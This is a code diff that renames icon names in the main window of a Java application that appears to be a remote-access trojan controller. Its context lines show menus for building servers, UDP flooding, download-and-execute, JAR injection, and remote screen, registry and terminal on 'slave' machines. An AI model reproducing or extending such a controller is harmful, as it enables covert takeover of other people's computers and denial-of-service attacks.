@@ -152,7 +152,7 @@ public class Frame extends BaseFrame {
 				frame.setVisible(true);
 			}
 		});
-		mntmAddSocket.setIcon(IconUtils.getIcon("socket_add"));
+		mntmAddSocket.setIcon(IconUtils.getIcon("socket-add"));
 		mnMain.add(mntmAddSocket);
 
 		if (Main.liteVersion) {
@@ -228,7 +228,7 @@ public class Frame extends BaseFrame {
 				new FrameBuildMinimal().setVisible(true);
 			}
 		});
-		mntmBuildServer.setIcon(IconUtils.getIcon("information-button"));
+		mntmBuildServer.setIcon(IconUtils.getIcon("info-button"));
 		mnServerModule.add(mntmBuildServer);
 
 		JMenuItem mntmAdvancedBuild = new JMenuItem("Advanced Builder");
@@ -239,7 +239,7 @@ public class Frame extends BaseFrame {
 				frame.setVisible(true);
 			}
 		});
-		mntmAdvancedBuild.setIcon(IconUtils.getIcon("information-button"));
+		mntmAdvancedBuild.setIcon(IconUtils.getIcon("info-button"));
 		mnServerModule.add(mntmAdvancedBuild);
 
 		JMenu mnKeys = new JMenu("Keys");
@@ -270,7 +270,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		mntmImportKey.setIcon(IconUtils.getIcon("key_arrow"));
+		mntmImportKey.setIcon(IconUtils.getIcon("key-arrow"));
 
 		JMenuItem mntmGenerateKey = new JMenuItem("Generate key");
 		mnKeys.add(mntmGenerateKey);
@@ -298,7 +298,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		mntmGenerateKey.setIcon(IconUtils.getIcon("key_plus"));
+		mntmGenerateKey.setIcon(IconUtils.getIcon("key-plus"));
 
 		JMenu mnHelp = new JMenu("Help");
 		mnMain.add(mnHelp);
@@ -321,7 +321,7 @@ public class Frame extends BaseFrame {
 				frame.setVisible(true);
 			}
 		});
-		mntmAProblemShow.setIcon(IconUtils.getIcon("information-button"));
+		mntmAProblemShow.setIcon(IconUtils.getIcon("info-button"));
 
 		JMenuItem mntmTwitter = new JMenuItem("Twitter");
 		mntmTwitter.addActionListener(new ActionListener() {
@@ -377,7 +377,7 @@ public class Frame extends BaseFrame {
 
 		JMenu mnPingIcon = new JMenu("Ping icon");
 		mnLook.add(mnPingIcon);
-		mnPingIcon.setIcon(IconUtils.getIcon("application_large"));
+		mnPingIcon.setIcon(IconUtils.getIcon("application-images"));
 
 		JMenuItem mntmMeter = new JMenuItem("Meter");
 		mntmMeter.addActionListener(new ActionListener() {
@@ -396,12 +396,12 @@ public class Frame extends BaseFrame {
 				mainTable.repaint();
 			}
 		});
-		mntmCircle.setIcon(IconUtils.getIcon("network_green"));
+		mntmCircle.setIcon(IconUtils.getIcon("network-green"));
 		mnPingIcon.add(mntmCircle);
 
 		JMenu mnTabPlacement = new JMenu("Tab placement");
 		mnLook.add(mnTabPlacement);
-		mnTabPlacement.setIcon(IconUtils.getIcon("application-dock-tab"));
+		mnTabPlacement.setIcon(IconUtils.getIcon("application-tabs"));
 
 		JMenuItem mntmTop = new JMenuItem("Top");
 		mntmTop.addActionListener(new ActionListener() {
@@ -458,7 +458,7 @@ public class Frame extends BaseFrame {
 				mainTable.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS);
 			}
 		});
-		mntmFit.setIcon(IconUtils.getIcon("application-resize-full"));
+		mntmFit.setIcon(IconUtils.getIcon("application-resize"));
 		mnTableResizeBehaviour.add(mntmFit);
 
 		JMenuItem mntmRowHeight = new JMenuItem("Row height");
@@ -481,7 +481,7 @@ public class Frame extends BaseFrame {
 				Settings.getGlobal().setVal("rowheight", h);
 			}
 		});
-		mntmRowHeight.setIcon(IconUtils.getIcon("window_dock"));
+		mntmRowHeight.setIcon(IconUtils.getIcon("application-dock"));
 
 		JMenuItem mntmColors = new JMenuItem("Colors");
 		mnLook.add(mntmColors);
@@ -491,7 +491,7 @@ public class Frame extends BaseFrame {
 				frame.setVisible(true);
 			}
 		});
-		mntmColors.setIcon(IconUtils.getIcon("color-swatches"));
+		mntmColors.setIcon(IconUtils.getIcon("color-palette"));
 
 		JMenuItem mntmGroups = new JMenuItem("Groups");
 		mnTools.add(mntmGroups);
@@ -535,7 +535,7 @@ public class Frame extends BaseFrame {
 				selectAll();
 			}
 		});
-		mntmSelectAll.setIcon(IconUtils.getIcon("select_all_"));
+		mntmSelectAll.setIcon(IconUtils.getIcon("select-all"));
 		mnServers.add(mntmSelectAll);
 
 		JMenuItem mntmSelectX = new JMenuItem("Select X");
@@ -565,7 +565,7 @@ public class Frame extends BaseFrame {
 				mainTable.repaint();
 			}
 		});
-		mntmSelectX.setIcon(IconUtils.getIcon("select_x"));
+		mntmSelectX.setIcon(IconUtils.getIcon("select-x"));
 		mnServers.add(mntmSelectX);
 
 		JMenuItem mntmUnselectAll = new JMenuItem("Unselect all");
@@ -641,7 +641,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		mntmReconnectAll.setIcon(IconUtils.getIcon("refresh_blue"));
+		mntmReconnectAll.setIcon(IconUtils.getIcon("refresh-blue"));
 		mnServers.add(mntmReconnectAll);
 		mntmDisconnectAll.setIcon(IconUtils.getIcon("delete"));
 		mnServers.add(mntmDisconnectAll);
@@ -725,7 +725,7 @@ public class Frame extends BaseFrame {
 				new FramePackPlugin().setVisible(true);
 			}
 		});
-		mntmPackPlugin.setIcon(IconUtils.getIcon("plugin_edit"));
+		mntmPackPlugin.setIcon(IconUtils.getIcon("plugin-edit"));
 		JMenuItem mntmBrowsePlugins = new JMenuItem("View Available Plugins");
 		mnPlugins.add(mntmBrowsePlugins);
 		
@@ -745,7 +745,7 @@ public class Frame extends BaseFrame {
 				frame.setVisible(true);
 			}
 		});
-		mntmBrowsePlugins.setIcon(IconUtils.getIcon("application_large"));
+		mntmBrowsePlugins.setIcon(IconUtils.getIcon("application-images"));
 		mntmBrowsePlugins.setEnabled(Main.isFeatureEnabled());
 
 		JMenu mnOther = new JMenu("Other");
@@ -826,7 +826,7 @@ public class Frame extends BaseFrame {
 				debug.setVisible(true);
 			}
 		});
-		mntmDebugerrorReportInfo.setIcon(IconUtils.getIcon("javascript"));
+		mntmDebugerrorReportInfo.setIcon(IconUtils.getIcon("java"));
 		mnAbout.add(mntmDebugerrorReportInfo);
 		mnAbout.addSeparator();
 		menuItem.setIcon(IconUtils.getIcon("info"));
@@ -849,7 +849,7 @@ public class Frame extends BaseFrame {
 		JScrollPane scrollPane = new JScrollPane();
 		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
 		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
-		tabbedPane.addTab("Main", IconUtils.getIcon("tab_main", true), scrollPane, null);
+		tabbedPane.addTab("Main", IconUtils.getIcon("tab-main", true), scrollPane, null);
 
 		popupMenu = new JPopupMenu();
 		popupMenu.addPopupMenuListener(new PopupMenuListener() {
@@ -1000,11 +1000,11 @@ public class Frame extends BaseFrame {
 		addPopup(mainTable, popupMenu);
 
 		JMenu mnNetworking = new JMenu("Networking");
-		mnNetworking.setIcon(IconUtils.getIcon("process_no"));
+		mnNetworking.setIcon(IconUtils.getIcon("process"));
 		popupMenu.add(mnNetworking);
 
 		JMenu mnStressing = new JMenu("Stressing");
-		mnStressing.setIcon(IconUtils.getIcon("http_flood"));
+		mnStressing.setIcon(IconUtils.getIcon("firewall"));
 		mnNetworking.add(mnStressing);
 
 		JMenuItem mntmUdpFlood = new JMenuItem("UDP");
@@ -1156,7 +1156,7 @@ public class Frame extends BaseFrame {
 
 		JMenuItem mntmexe = new JMenuItem("Download and Execute");
 		mnNetworking.add(mntmexe);
-		mntmexe.setIcon(IconUtils.getIcon("down_arrow"));
+		mntmexe.setIcon(IconUtils.getIcon("arrow-down"));
 
 		JMenuItem mntmUploadAndExecute = new JMenuItem("Upload and Execute");
 		mntmUploadAndExecute.setIcon(IconUtils.getIcon("drive-upload"));
@@ -1219,7 +1219,7 @@ public class Frame extends BaseFrame {
 
 		JMenuItem mntmHost = new JMenuItem("Host");
 		mnNetworking.add(mntmHost);
-		mntmHost.setIcon(IconUtils.getIcon("computer_info"));
+		mntmHost.setIcon(IconUtils.getIcon("computer"));
 		mntmHost.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				AbstractSlave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
@@ -1287,7 +1287,7 @@ public class Frame extends BaseFrame {
 		});
 
 		JMenu mnQuickOpen = new JMenu("Quick Open");
-		mnQuickOpen.setIcon(IconUtils.getIcon("window_import"));
+		mnQuickOpen.setIcon(IconUtils.getIcon("application-import"));
 		popupMenu.add(mnQuickOpen);
 
 		JMenuItem mntmRemoteScreen = new JMenuItem("Remote Screen");
@@ -1330,7 +1330,7 @@ public class Frame extends BaseFrame {
 
 			}
 		});
-		mntmVisitUrl.setIcon(IconUtils.getIcon("window_browser"));
+		mntmVisitUrl.setIcon(IconUtils.getIcon("application-browser"));
 		mntmRemoteScreen.setIcon(IconUtils.getIcon("screen"));
 		mnQuickOpen.add(mntmRemoteScreen);
 
@@ -1357,7 +1357,7 @@ public class Frame extends BaseFrame {
 		});
 		mntmRemoteRegistry.setIcon(IconUtils.getIcon("registry"));
 		mnQuickOpen.add(mntmRemoteRegistry);
-		mntmFileManager.setIcon(IconUtils.getIcon("folder_go"));
+		mntmFileManager.setIcon(IconUtils.getIcon("folder-go"));
 		mnQuickOpen.add(mntmFileManager);
 
 		JMenuItem mntmRemoteCmd = new JMenuItem("Remote Terminal");
@@ -1370,7 +1370,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		mntmRemoteCmd.setIcon(IconUtils.getIcon("cmd"));
+		mntmRemoteCmd.setIcon(IconUtils.getIcon("terminal"));
 		mnQuickOpen.add(mntmRemoteCmd);
 
 		JMenuItem mntmRemoteChat = new JMenuItem("Remote Chat");
@@ -1394,13 +1394,13 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		mntmRemoteProcess.setIcon(IconUtils.getIcon("process"));
+		mntmRemoteProcess.setIcon(IconUtils.getIcon("process-go"));
 		mnQuickOpen.add(mntmRemoteProcess);
 		mntmRemoteChat.setIcon(IconUtils.getIcon("chat"));
 		mnQuickOpen.add(mntmRemoteChat);
 
 		JMenuItem mntmNotes = new JMenuItem("Notes");
-		mntmNotes.setIcon(IconUtils.getIcon("sticky-notes-pin"));
+		mntmNotes.setIcon(IconUtils.getIcon("notes"));
 		mntmNotes.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				AbstractSlave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
@@ -1435,7 +1435,7 @@ public class Frame extends BaseFrame {
 						}
 					}
 				});
-				mntmRunCommand.setIcon(IconUtils.getIcon("runcmd"));
+				mntmRunCommand.setIcon(IconUtils.getIcon("execute"));
 
 		JMenu mnInject = new JMenu("Inject JAR");
 		mnTools_1.add(mnInject);
@@ -1470,7 +1470,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		mntmInjectFromUrl.setIcon(IconUtils.getIcon("down_arrow"));
+		mntmInjectFromUrl.setIcon(IconUtils.getIcon("arrow-down"));
 		mnInject.add(mntmInjectFromUrl);
 
 		JMenuItem mntmInjectFromFile = new JMenuItem("Inject from file");
@@ -1610,7 +1610,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		mntmRestartConnection.setIcon(IconUtils.getIcon("refresh_blue"));
+		mntmRestartConnection.setIcon(IconUtils.getIcon("refresh-blue"));
 		popupMenu.add(mntmRestartConnection);
 		mntmForceDisconnect.setIcon(IconUtils.getIcon("delete"));
 		popupMenu.add(mntmForceDisconnect);
@@ -1649,7 +1649,7 @@ public class Frame extends BaseFrame {
 		tabbedPane.addTab("Network Usage", IconUtils.getIcon("network"), panelNetwork, null);
 
 		JPanel panel_onconnect = new JPanel();
-		tabbedPane.addTab("On Connect", IconUtils.getIcon("onconnect", true), panel_onconnect, null);
+		tabbedPane.addTab("On Connect", IconUtils.getIcon("calendar", true), panel_onconnect, null);
 
 		JScrollPane scrollPane_1 = new JScrollPane();
 		scrollPane_1.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
@@ -1666,7 +1666,7 @@ public class Frame extends BaseFrame {
 			}
 		});
 
-		btnAdd.setIcon(IconUtils.getIcon("calendar_add"));
+		btnAdd.setIcon(IconUtils.getIcon("calendar-add"));
 
 		final JButton btnDelete = new JButton("Delete");
 		btnDelete.setToolTipText("Delete selected event");
@@ -1679,7 +1679,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		btnDelete.setIcon(IconUtils.getIcon("calendar_remove"));
+		btnDelete.setIcon(IconUtils.getIcon("calendar-remove"));
 
 		JButton btnPerform = new JButton("Perform");
 		btnPerform.setToolTipText("Perform selected event on all connections");
@@ -1696,7 +1696,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		btnPerform.setIcon(IconUtils.getIcon("calendar_perform"));
+		btnPerform.setIcon(IconUtils.getIcon("calendar-perform"));
 
 		JButton btnEdit = new JButton("Edit");
 		btnEdit.setToolTipText("Edit selected event");
@@ -1714,7 +1714,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		btnEdit.setIcon(IconUtils.getIcon("calendar_edit.png"));
+		btnEdit.setIcon(IconUtils.getIcon("calendar-edit.png"));
 
 		GroupLayout gl_panel_onconnect = new GroupLayout(panel_onconnect);
 		gl_panel_onconnect.setHorizontalGroup(gl_panel_onconnect.createParallelGroup(Alignment.TRAILING).addGroup(gl_panel_onconnect.createSequentialGroup().addContainerGap(56, Short.MAX_VALUE).addComponent(btnEdit).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnPerform).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnDelete).addPreferredGap(ComponentPlacement.RELATED).addComponent(boxOnConnect, GroupLayout.PREFERRED_SIZE, 158, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnAdd, GroupLayout.PREFERRED_SIZE, 91, GroupLayout.PREFERRED_SIZE).addContainerGap()).addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 602, Short.MAX_VALUE));
